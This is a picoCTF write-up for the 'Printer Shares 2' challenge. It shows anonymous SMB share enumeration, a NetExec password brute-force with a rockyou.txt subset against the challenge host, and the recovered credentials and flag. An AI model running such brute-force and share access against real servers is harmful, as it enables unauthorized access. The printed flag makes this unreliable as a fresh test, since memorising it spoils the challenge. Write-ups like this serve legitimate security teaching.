#  CTF Write-up: Printer Shares 2

##  Challenge Information

* **Event:** picoCTF
* **Challenge:** Printer Shares 2
* **Category:** General Skills
* **Difficulty:** Medium
* **Points:** 200
* **Author:** Janice He

### Description

A Secure Printer is now in use. I’m confident no one can leak the message again... or can you?
Two printers are on `[INSTANCE_PORT]`, one private and one public.

You can test the service with:

```bash
nc -vz green-hill.picoctf.net [INSTANCE_PORT]
```

*(Note: The port changes dynamically depending on the instance, e.g., `50965`).*

### Hints

1. Default password is dangerous, isn't it?
2. Can you find a potential user? What is the username?
3. The wordlist `rockyou.txt` is pretty common for password cracking.

---

# Initial Enumeration

The challenge exposes a service that hosts **two SMB printer shares**: one **public** and one **private**.

First, enumerate the available SMB shares using an anonymous connection:

```bash
smbclient -L green-hill.picoctf.net -p 50965 -N
```

Output shows two shares:

* `shares` → Public Share With Guests
* `secure-shares` → Printer for internal usage only

---

# Exploring the Public Share

Access the public share:

```bash
smbclient green-hill.picoctf.net/shares -p 50965 -N ( remember to change the -p with your current port )
```

List the files:

```bash
ls
```

Files discovered:

* `content.txt`
* `kafka.txt`
* `notification.txt`

Download them:

```bash
get content.txt
get kafka.txt
get notification.txt
```

Two files (`content.txt`, `kafka.txt`) are distractions.
However, `notification.txt` contains a crucial hint.

```bash
cat notification.txt
```

Output:

```
Hi Joe,

We’ve identified a vulnerability in this printer. Until the issue is resolved, please use an alternative printer.

If you have never logged into the printer before, please note that the default password is currently in use.

Best,
The Operator Team
```

---

# Analyzing the Clues

From the message:

* **Username:** `joe`
* **Password:** likely a **default password**

Hints suggest performing **password brute-forcing using `rockyou.txt`**.

---

# Exploitation (SMB Brute Force)

Goal: access the private share **secure-shares** using the user `joe`.

Modern picoCTF SMB servers often disable **SMBv1**, which causes tools like Hydra to fail.
A reliable alternative is **NetExec**.

---

## Step 1 — Create a Smaller Wordlist

Extract the most common passwords from `rockyou.txt`:

```bash
head -n 5000 /usr/share/wordlists/rockyou.txt > top5000.txt
```

---

## Step 2 — Run NetExec

```bash
netexec smb green-hill.picoctf.net --port 50965 -u joe -p top5000.txt
```

Successful output:

```
SMB   green-hill.picoctf.net   50965   CHALLENGE   [+] CHALLENGE\joe:popcorn
```

Credentials discovered:

```
Username: joe
Password: popcorn
```

---

# Retrieving the Flag

Connect to the private share:

```bash
smbclient //green-hill.picoctf.net/secure-shares -p 50965 -U joe
```

Enter password:

```
popcorn
```

List files:

```bash
ls
```

Output:

```
.        D        0
..       D        0
flag.txt N       44
```

Download the flag:

```bash
get flag.txt
exit
```

Read the flag:

```bash
cat flag.txt
```

---

# Flag

```
picoCTF{5mb_pr1nter_5h4re5_5ecure_b243735c}
```
